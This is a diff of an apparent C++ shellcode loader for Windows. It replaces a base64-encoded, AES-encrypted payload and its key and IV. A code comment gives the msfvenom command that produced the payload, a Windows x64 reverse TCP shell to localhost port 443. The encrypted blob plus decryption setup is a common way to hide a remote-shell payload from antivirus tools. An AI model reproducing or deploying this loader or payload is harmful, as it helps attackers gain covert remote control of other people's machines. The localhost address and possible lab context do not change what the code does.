@@ -105,15 +105,15 @@ int main()
 
     // Decode shellcode and load into uint8_t vector for decryption
     // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
-    shellcode = "OexHMBPZzhVXMsdoIod6Kt0xP+9n/Yt+oZMrKxT64SCh5XV/DUm5RJc6/lAj6mZDIQptH+tqUhVJaSi5kcdphEq6PjuqLV3OUsI9lbh9FCg5fxbhedlvLkiHl3RhdFGsZW9OBC70pM/wlJ+XEr5I7K5/sB1DXs4Hdp27Fy6yi406csaVudccj3q+645j01i4uRidBZuLwM2HGKp905mAAzW+FnC5VAdbR5OTsqfyRME43c/gy6MdiqkkQHA+aGvBi+7eGf/6L9nOIVeeG1nmHi8NgVTR+j4kkGBbYXP5H5rDeeBFkoQxZONnIr+ZvtFL4uXB857jk2RrMYtaWmgZFEQrs0cv7QNoOVkCZZ6OohDWZ10ke9TzEwz8RVOZXhmOzxOlIVCThbIEowBTfnjWojbUgGBl4HhdAuKE/hKuX/+1oat4zKfQDo/Gwk0iVi0bOKAgos2lDWQXaQt7H21TtfWLw7Yuz0/FzKfNhDa5eIUV+X/+rmYCNSnYgwOD3c27Ko8lbk+Y25Rtjx2XOFCfO/YSRRlCpuJ+1n6HbtJbDnco2JZAaIZjZg9lMx09/z6UmCUlkvYXCSNdhLLsEmYkBrr7JEzTQFDfUyFl89A2/f9GW9Mxv1LR6gnDfM95duYJhV8WXlPq0OWgrVSE6rz6TS0ByUXRA4KyeX9OIqYTBAl239LjJRDIJ4/V1DHp8J3gz5EPU1pK3ITyp5/e4hYALsWr9JRO0/DqGLGlzTpKsQUu8VlKiSgyARRmcA62MAjR7BfYxA6if9RHdB+Oi09/ppd7NM9LQVHf/mmtvnEGFy0SP2GGXMyKV1WBbL9POwGQBMgHQd7ImKD1vvX73nIZcHMWkmO2Bc780tuqXs71kNikCs8S0AY7s+jngq9PcR7dW3SSjy2CsAF3TDVVmq+xuuhpzkjb/1VJM/JUwolAFSc4AF+OLEh1vyjFy+/FIrTo4UpWTtVbHo8Isj3MdwQwo7VLQCNMtXk6yDVA2KjTqNVqtrtMyG3I3Ps2vmHbCEEGVi87QpoqUAd16eUNj7G2v1+eaQMWCuJMv4ufFCBrw9IHozPMuJLFSx+tP7YT1/d4AWoKygq1kShpS69ykKKKCWqKLSLiRPNPKkVMIYnrjaSXHfUx65ThtlwB/B6e75HXfCvSCxtPbfK5I85g5Xmptq6+iaxEMlDpdCnUx7vpIR9+M8x+gW8BHmQ58LkX4Te5LFrwrwlAhlepzyo3v1IWVA==";
+    shellcode = "+R1SJjLLLLZxU7aVqyWuQTHkgmq8rINN1WT7jQTgRFDmWGCNTMf2cn+Vy9hV9y1BSQa+1xLNOBmkodx9Scx5wD+ljpuciiJ7aygUK3waZLblMTC5dUgZsUocxYo8sg4B76KumKv2D+iGbPHboRIF4zs56kc2ya4ZgIfh/PJuSv4zIJ4qrClS1uGUt1h4L7j6G46TbEuciRO6mUEonYgbM0jYhsCNdStZYOfw5WCBWr6g/ipPlPibWA40fVLP/RKRKX5QKf8553CJuRbWF+m0RYeuhF+YkMTscmJUuoLC+S7Iow1B7Ui/Ehs82uN5+ie2Mjd3WDCF09hLvUfwTj73zh4FTCNQVtv1YTHYyjcVI3eOzWMrKAH+QTFtE9Nbp/5LFqRwKTvLpIBIQIq7s+qMyvBOFHUNEeMDhKvfRTLriS/vTXAbXNItnqd5vYutk3xlDTr3ULQir8r/G2GLPY/wTLZLM9l/KXdLBAMEVW3AXNUNwwW/T1lHt4OdwtyhrAgfBOVl4QBj03cQV3WzHYliwko9ustTQxcKz2gA/GwwAUSCrEv5OQcNYNLo6r20JZbaLAaEWfpVSpDGzjBZ6bsIXZjZslUgWQA0VYAxHUFgc6U8SYYIs5zU3+LfRjgxpjSRvn41POSkbw6f4xazUNge/yVWGI8fBbovyKv9tK0cbRCDpAbHkh4O1JqlU/P9Jxd4wDYeHPEZFjSfEoTUbWlCMqF3ADVWB5QDrlNIZoQF/4zqQJ6hyILe0oMfEXNgTTW/W5BAC03q8012/+BmakajaWEtDxo6QukaMIntXpPjFWzg19mUxfQFyUnsr91igW/vl2brVOAYlbBJ9E7JN6A6q8rwF4x22L+q3Dl2UCL8f0dDaXwyXu3Omu3Q05Cn/KocoA+Dl6aZ0xTl7zpZ/qBSTveR60WR451JqyOsCsI2ArKIJZk82puv9d8ilHshUAu6SUoSyLMb8R5ZPmJya9942cbLT4LKIaL43rndZWu086Ux/jt8Z0C3vwt/bBu8uP6ML4bAOpQCI77RkGZhGa/3owBpr7GuuD/HgwrH9yhQ5xS+wasEHTOKrqLoAImA/s9R5+9GOmeUkUjOCFcdr8+upKmJQFNJf2DlsMKLeAv4b1A+CcyelTIzbicJQUnQdVR35WFt3DhvWqvQa+gMkt2eLoctaLF31eZouQqh6ZPBkkU/eoJ6/0nXHz9KI1YjfN8anXjythb2SXNvbRDG7eCjCw==";
     decoded = b64.base64_decode(shellcode);
     ciphertext.clear();
     std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
 
     // AES Decryption Objects
     struct AES_ctx e_ctx;
-    uint8_t key[32] = {0xce,0x2d,0xd8,0x55,0xc8,0xb7,0x80,0x63,0xf7,0xdb,0xe7,0x00,0x7f,0x14,0x57,0x4c,0x7e,0x9e,0xcb,0x7b,0x25,0xc5,0x84,0xa1,0x7d,0xdb,0x83,0xa2,0x88,0x70,0x0b,0xfc};
-    uint8_t iv[16] = {0xce,0x3a,0x38,0xe7,0x31,0x7b,0x49,0x27,0xc8,0x58,0x2b,0x43,0x3d,0xa6,0x12,0x7f};
+    uint8_t key[32] = {0x5f,0x72,0x19,0x5f,0xb1,0xe7,0xc5,0xc1,0x8f,0x45,0xaa,0x53,0x0f,0x4b,0x55,0xeb,0xb1,0xd3,0x31,0x08,0x60,0x87,0x35,0x73,0xe1,0x40,0x2e,0x9a,0xd9,0xe8,0x06,0xb7};
+    uint8_t iv[16] = {0x16,0xd3,0xc3,0x4b,0x11,0xe5,0x46,0x99,0x58,0xef,0xec,0xd8,0xf5,0xa6,0x0d,0xbc};
     
     AES_init_ctx_iv(&e_ctx, key, iv);
 
